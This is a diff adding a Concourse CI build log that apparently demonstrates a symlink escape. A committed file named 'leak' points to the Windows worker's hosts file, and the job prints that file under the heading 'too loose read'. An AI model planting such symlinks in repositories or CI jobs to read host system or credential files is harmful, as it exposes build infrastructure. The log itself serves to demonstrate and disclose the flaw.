@@ -1,0 +1,46 @@
+[1mselected worker:[0m wrk-lin-0-0f9508b0714f9365f
+Identity added: /tmp/git-resource-private-key (ci@pix4d.com)
+Cloning into '/tmp/build/get'...
+remote: Enumerating objects: 4, done.        
+remote: Counting objects:  25% (1/4)        remote: Counting objects:  50% (2/4)        remote: Counting objects:  75% (3/4)        remote: Counting objects: 100% (4/4)        remote: Counting objects: 100% (4/4), done.        
+remote: Total 4 (delta 0), reused 3 (delta 0), pack-reused 0 (from 0)        
+Receiving objects:  25% (1/4)Receiving objects:  50% (2/4)Receiving objects:  75% (3/4)Receiving objects: 100% (4/4)Receiving objects: 100% (4/4), done.
+82f7e4f demo: demo/exfil-windows only
+[1minitializing[0m
+[1mno suitable workers found, waiting for worker...[0m
+[1mselected worker:[0m wrk-win2025-vs2026-build-win-0-082c64ee436d0eb9c
+[1mstreaming volume[0m exfil-windows-repo [1mfrom worker[0m wrk-lin-0-0f9508b0714f9365f
+[1mrunning cmd /C dir exfil-windows-repo\exfil-windows && echo ==== too loose read ==== && type exfil-windows-repo\exfil-windows\leak[0m
+ Volume in drive C is Windows
+ Volume Serial Number is 1C9E-0F09
+
+ Directory of C:\Users\concourse\worker\containers\00003jda1gl\tmp\build\15f44ed9\exfil-windows-repo\exfil-windows
+
+06/09/2026  03:29 PM    <DIR>          .
+06/09/2026  03:29 PM    <DIR>          ..
+06/09/2026  03:29 PM    <SYMLINK>      leak [\Windows\System32\drivers\etc\hosts]
+               1 File(s)              0 bytes
+               2 Dir(s)  141,392,433,152 bytes free
+==== too loose read ==== 
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#	127.0.0.1       localhost
+#	::1             localhost
+succeeded
